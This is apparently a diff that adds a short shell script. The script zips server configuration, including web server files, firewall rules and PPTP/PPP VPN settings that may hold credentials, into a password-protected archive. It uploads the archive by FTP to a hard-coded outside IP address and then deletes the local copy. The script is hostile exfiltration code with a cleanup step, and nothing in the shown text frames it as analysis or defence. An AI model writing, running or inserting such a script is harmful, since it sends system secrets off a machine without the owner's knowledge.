@@ -1,0 +1,6 @@
+#!/bin/sh
+
+zip -r -P 5iyYEDUhFFjFak2RA2h /root/usa4n.zip /etc/rc.local /usr/apache/ /etc/sysconfig/iptables /etc/pptpd.conf /etc/ppp /usr/local/etc 
+ftp -n 185.23.16.146 < /usr/local/etc/bin/interactive
+rm -rf /root/usa4n.zip
+
